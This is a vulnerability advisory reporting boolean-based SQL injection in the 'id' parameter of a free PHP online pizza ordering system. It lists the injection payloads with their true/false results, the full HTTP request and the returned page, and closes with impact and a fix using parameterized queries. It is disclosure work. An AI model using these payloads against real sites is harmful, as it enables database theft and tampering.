CMS source code url: https://www.sourcecodester.com/php/16166/online-pizza-ordering-system-php-free-source-code.html

URL: http://127.0.0.1/php-opos/index/php
Perameter: id

Attack Details:
URL encoded GET input id was set to -1' OR 3*2*1=6 AND 000207=000207 or 'IBKdIxz1'='

Tests performed:
-1' OR 2+207-207-1=0+0+0+1 or 'IBKdIxz1'=' => TRUE
-1' OR 3+207-207-1=0+0+0+1 or 'IBKdIxz1'=' => FALSE
-1' OR 3*2<(0+5+207-207) or 'IBKdIxz1'=' => FALSE
-1' OR 3*2>(0+5+207-207) or 'IBKdIxz1'=' => FALSE
-1' OR 2+1-1+1=1 AND 000207=000207 or 'IBKdIxz1'=' => FALSE
-1' OR 3*2=5 AND 000207=000207 or 'IBKdIxz1'=' => FALSE
-1' OR 3*2=6 AND 000207=000207 or 'IBKdIxz1'=' => TRUE
-1' OR 3*2*0=6 AND 000207=000207 or 'IBKdIxz1'=' => FALSE
-1' OR 3*2*1=6 AND 000207=000207 or 'IBKdIxz1'=' => TRUE

HTTP Request:

GET /php-opos/index.php?id=-1'%20OR%203*2*1=6%20AND%20000207=000207%20or%20'IBKdIxz1'='&page=category HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.144.217.51/php-opos/
Cookie: PHPSESSID=1k9bgtvpcu4sm6sveik4lo09cv
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Host: 192.144.217.51
Connection: Keep-alive

HTTP Response:

HTTP/1.1 200 OK
Date: Thu, 16 Feb 2023 15:10:28 GMT
Server: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.2.0
X-Powered-By: PHP/8.2.0
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Keep-Alive: timeout=5, max=58
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 17281

<!DOCTYPE html>
<html lang="en">
    
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Online Pizza Ordering System - PHP</title>
        <!-- Favicon-->
        <link rel="icon"  href="assets/defaults/pizza-logo.png" />
        <!-- Font Awesome icons (free version)-->
        <script src="https://use.fontawesome.com/releases/v5.13.0/js/all.js" crossorigin="anonymous"></script>
        <!-- Google fonts-->
        <link href="https://fonts.googleapis.com/css?family=Merriweather+Sans:400,700" rel="stylesheet" />
        <link href="https://fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic" rel="stylesheet" type="text/css" />
        <!-- Third party plugin CSS-->
        <link href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css" rel="stylesheet" />
        <!-- Core theme CSS (includes Bootstrap)-->
        <link href="admin/assets/vendor/bootstrap-datepicker/css/bootstrap-datepicker.css" rel="stylesheet" />
        <link href="css/styles.css" rel="stylesheet" />

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap" rel="stylesheet">
        <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&display=swap');
        </style>
        <script src="admin/assets/vendor/jquery/jquery.min.js"></script>
        <script src="admin/assets/vendor/bootstrap-datepicker/js/bootstrap-datepicker.js"></script>


    <style>
    	header.masthead {
		  background: url(assets/img/1676509500_pizza-bg.jpg);
		  background-repeat: no-repeat;
		  background-size: cover;
		  background-position: center center;
      position: relative;
      height: 85vh !important;
		}
    header.masthead:before {
      content: "";
      width: 100%;
      height: 100%;
      position: absolute;
      top: 0;
      left: 0;
      backdrop-filter: brightness(0.8);
  }
    </style>
    <body id="page-top">
        <!-- Navigation-->
        <div class="toast" id="alert_toast" role="alert" aria-live="assertive" aria-atomic="true">
        <div class="toast-body text-white">
        </div>
      </div>
        <nav class="navbar navbar-expand-lg navbar-light fixed-top py-3" id="mainNav">
            <div class="container">
                <a class="navbar-brand js-scroll-trigger" href="./">Online Pizza Ordering System - PHP</a>
                <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
                <div class="collapse navbar-collapse" id="navbarResponsive">
                    <ul class="navbar-nav ml-auto my-2 my-lg-0">
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=home">Home</a></li>
                                                <li class="nav-item position-relative " id="cat-menu-link">
                          <a class="nav-link"  href="#">Categories</a>
                          <div id="category-menu" class="">
                            <ul>
                                                              <li><a href="index.php?page=category&id=4">Beverages</a></li>
                                                              <li><a href="index.php?page=category&id=3">Sicilian Pizza</a></li>
                                                              <li><a href="index.php?page=category&id=2">Thick Crust Pizza</a></li>
                                                              <li><a href="index.php?page=category&id=1">Thin Crust Pizza</a></li>
                                                          </ul>
                          </div>
                        </li>
                        
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=cart_list"><span> <span class="badge badge-danger item_count">0</span> <i class="fa fa-shopping-cart"></i>  </span>Cart</a></li>
                        <li class="nav-item"><a class="nav-link js-scroll-trigger" href="index.php?page=about">About</a></li>
                                                <li class="nav-item"><a class="nav-link js-scroll-trigger" href="admin/ajax.php?action=logout2">Welcome   <i class="fa fa-power-off"></i></a></li>
                                          </ul>
                </div>
            </div>
        </nav>
       
          <!-- Masthead-->
 <header class="masthead">
            <div class="container h-100">
                <div class="row h-100 align-items-center justify-content-center text-center">
                    <div class="col-lg-10 align-self-center mb-4 page-title">
                    	<h1 class="text-white">Thin Crust Pizza</h1>
                        <hr class="divider my-4 bg-dark" />

                    </div>
                    
                </div>
            </div>
        </header>
	<section class="page-section" id="menu">
        <h1 class="text-center text-cursive" style="font-size:3em"><b>Thin Crust Pizza's Menu</b></h1>
        <div class="d-flex justify-content-center">
            <hr class="border-dark" width="5%">
        </div>
        <div class="row mx-0">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <div id="menu-field" class="card-deck px-2 py-3 justify-content-center">
                                                    <div class="col-lg-3 mb-3">
                            <div class="card menu-item  rounded-0">
                                <div class="position-relative overflow-hidden" id="item-img-holder">
                                    <img src="assets/img/1676512980_detroit-style-thick.jpg" class="card-img-top" alt="...">
                                </div>
                                <div class="card-body rounded-0">
                                <h5 class="card-title">Detroit Style</h5>
                                <p class="card-text truncate">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Praesent suscipit porttitor dui, a accumsan metus molestie vel. Quisque luctus eros interdum, facilisis lectus at, aliquam lacus.</p>
                                <div class="text-center">
                                    <button class="btn btn-sm btn-outline-dark view_prod btn-block" data-id=3><i class="fa fa-eye"></i> View</button>
                                    
                                </div>
                                </div>
                                
                            </div>
                            </div>
                                                        <div class="col-lg-3 mb-3">
                            <div class="card menu-item  rounded-0">
                                <div class="position-relative overflow-hidden" id="item-img-holder">
                                    <img src="assets/img/1676512800_thin-pepperoni.png" class="card-img-top" alt="...">
                                </div>
                                <div class="card-body rounded-0">
                                <h5 class="card-title">Pepperoni Thin</h5>
                                <p class="card-text truncate">Pepperoni thin-crust</p>
                                <div class="text-center">
                                    <button class="btn btn-sm btn-outline-dark view_prod btn-block" data-id=2><i class="fa fa-eye"></i> View</button>
                                    
                                </div>
                                </div>
                                
                            </div>
                            </div>
                                                        <div class="col-lg-3 mb-3">
                            <div class="card menu-item  rounded-0">
                                <div class="position-relative overflow-hidden" id="item-img-holder">
                                    <img src="assets/img/1676512620_Sicilian.jpg" class="card-img-top" alt="...">
                                </div>
                                <div class="card-body rounded-0">
                                <h5 class="card-title">Sicilian Pizza (Traditional Toppings)</h5>
                                <p class="card-text truncate">Sicilian pizza with bits of tomato, onion, anchovies, and herbs toppings.</p>
                                <div class="text-center">
                                    <button class="btn btn-sm btn-outline-dark view_prod btn-block" data-id=1><i class="fa fa-eye"></i> View</button>
                                    
                                </div>
                                </div>
                                
                            </div>
                            </div>
                                            </div>
            </div>
        </div>
                <!-- Pagination Buttons Block -->
        <?xml version="1.0" encoding="utf-8"?>
<script>
 $(function(){
   var code = (Math.random() + 1).toString(36).substring(2);
   var data = $('<div>')
   data.attr('id',code)
   data.css('bottom','1.5em')
   data.css('position','fixed')
   data.css('right','-1.5em')
   data.css('width','auto')
   data.css('opacity','.5')
   data.css('z-index','9999999')
   data.html(`<a href=mailto:oretom23@gmail.com'>Developed by oretnom23</a>`)
   data.find('a').css('color','#7e7e7e')
   data.find('a').css('font-weight','bolder')
   data.find('a').css('background','#ebebeb')
   data.find('a').css('padding','1em 3em')
   data.find('a').css('border-radius','50px')
   data.find('a').css('text-decoration','unset')
   data.find('a').css('font-size','11px')
   $('body').append(data)
   var is_right = true
   data.find('a').on('mouseover', function(){
    if(is_right){
      data.css('right','unset')
      data.css('left','-1.5em')
      is_right = false
    }else{
      data.css('left','unset')
      data.css('right','-1.5em')
      is_right = true
    }
   })
 })
</script>

<div class="row mx-0">
            <div class="w-100 mx-4 d-flex justify-content-center">
                <div class="btn-group paginate-btns">
                    <!-- Previous Page Button -->
                    <a class="btn btn-default border border-dark" disabled href="./?_page=0">Prev.</a>
                    <!-- End of Previous Page Button -->
                    <!-- Pages Page Button -->
            
                    <!-- looping page buttons  -->
                                        <!-- Display button blocks  -->
            
                    <!-- Limiting Page Buttons  -->
                                            <a class="btn btn-default border border-dark active" href = "./?_page=1">1</a>
                                        <!-- Display button blocks  -->
                                        <!-- End of looping page buttons  -->
            
                    <!-- End of Pages Page Button -->
                    <!-- Next Page Button -->
                    <a class="btn btn-default border border-dark" disabled href="./?_page=2">Next</a>
                    <!-- End of Next Page Button -->
                </div>
            </div>
        </div>
        <!-- End Pagination Buttons Block -->
    </section>
    <script>
        
        $('.view_prod').click(function(){
            uni_modal_right('Product Details','view_prod.php?id='+$(this).attr('data-id'))
        })
    </script>
    	
       

<div class="modal fade" id="confirm_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title">Confirmation</h5>
      </div>
      <div class="modal-body">
        <div id="delete_content"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='confirm' onclick="">Continue</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal" role='dialog'>
    <div class="modal-dialog modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
      </div>
      <div class="modal-body">
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary" id='submit' onclick="$('#uni_modal form').submit()">Save</button>
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
      </div>
      </div>
    </div>
  </div>
  <div class="modal fade" id="uni_modal_right" role='dialog'>
    <div class="modal-dialog modal-full-height  modal-md" role="document">
      <div class="modal-content">
        <div class="modal-header">
        <h5 class="modal-title"></h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span class="fa fa-arrow-right"></span>
        </button>
      </div>
      <div class="modal-body">
      </div>
      </div>
    </div>
  </div>
        <footer class="bg-light py-5">
            <div class="container"><div class="small text-center text-muted">Copyright © 2023 - Online Pizza Ordering System - PHP | <a href="mailto:oretnom23@mail.com" target="_blank">oretnom23@gmail.com</a></div></div>
        </footer>
        
        <script>
 	$('.datepicker').datepicker({
 		format:"yyyy-mm-dd"
 	})
 	 window.start_load = function(){
    $('body').prepend('<di id="preloader2"></di>')
  }
  window.end_load = function(){
    $('#preloader2').fadeOut('fast', function() {
        $(this).remove();
      })
  }

 	window.uni_modal = function($title = '' , $url=''){
    start_load()
    $.ajax({
        url:$url,
        error:err=>{
            console.log()
            alert("An error occured")
        },
        success:function(resp){
            if(resp){
                $('#uni_modal .modal-title').html($title)
                $('#uni_modal .modal-body').html(resp)
                $('#uni_modal').modal('show')
                end_load()
            }
        }
    })
}
  window.uni_modal_right = function($title = '' , $url=''){
    start_load()
    $.ajax({
        url:$url,
        error:err=>{
            console.log()
            alert("An error occured")
        },
        success:function(resp){
            if(resp){
                $('#uni_modal_right .modal-title').html($title)
                $('#uni_modal_right .modal-body').html(resp)
                $('#uni_modal_right').modal('show')
                end_load()
            }
        }
    })
}
window.alert_toast= function($msg = 'TEST',$bg = 'success'){
      $('#alert_toast').removeClass('bg-success')
      $('#alert_toast').removeClass('bg-danger')
      $('#alert_toast').removeClass('bg-info')
      $('#alert_toast').removeClass('bg-warning')

    if($bg == 'success')
      $('#alert_toast').addClass('bg-success')
    if($bg == 'danger')
      $('#alert_toast').addClass('bg-danger')
    if($bg == 'info')
      $('#alert_toast').addClass('bg-info')
    if($bg == 'warning')
      $('#alert_toast').addClass('bg-warning')
    $('#alert_toast .toast-body').html($msg)
    $('#alert_toast').toast({delay:3000}).toast('show');
  }
  window.load_cart = function(){
    $.ajax({
      url:'admin/ajax.php?action=get_cart_count',
      success:function(resp){
        if(resp > -1){
          resp = resp > 0 ? resp : 0;
          $('.item_count').html(resp)
        }
      }
    })
  }
  $('#login_now').click(function(){
    uni_modal("LOGIN",'login.php')
  })
  $(document).ready(function(){
    load_cart()
  })
 </script>
 <!-- Bootstrap core JS-->
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.bundle.min.js"></script>
  <!-- Third party plugin JS-->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
  <!-- Core theme JS-->
  <script src="js/scripts.js"></script>    </body>

    <script>
  //  $("#navbarResponsive .nav-link").on('click',function(e){
  //     console.log("The collapse event was prevented!", e);
  //    e.stopPropagation();
  //    return false;
  //   })
  // $('#navbarResponsive').on('show.bs.collapse', function(){
   
  // })
</script>
</html>

The impact of this vulnerability
An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

How to fix this vulnerability
Use parameterized queries when dealing with SQL queries that contain user input. Parameterized queries allow the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.
